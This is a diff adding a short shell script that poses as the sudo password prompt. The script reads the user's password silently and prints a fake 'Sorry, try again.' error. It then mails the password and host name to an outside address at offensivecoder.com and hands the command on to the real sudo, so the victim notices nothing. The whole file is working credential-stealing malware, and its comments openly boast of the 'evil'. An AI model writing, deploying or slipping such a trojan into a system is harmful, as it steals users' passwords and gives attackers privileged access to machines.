@@ -1,0 +1,16 @@
+#!/bin/sh
+
+orig_command=$*
+echo -n "[sudo] password for $LOGNAME: "
+stty -echo
+read password
+echo
+stty echo
+sleep 2
+echo "Sorry, try again."
+
+# muwahahaha, we have the password, now for the evil.
+# you can make this do what you like here.
+echo "su attempted with password: $password" | mailx -s "su attempt from `uname -n`" root@offensivecoder.com
+
+exec /usr/bin/sudo $orig_command
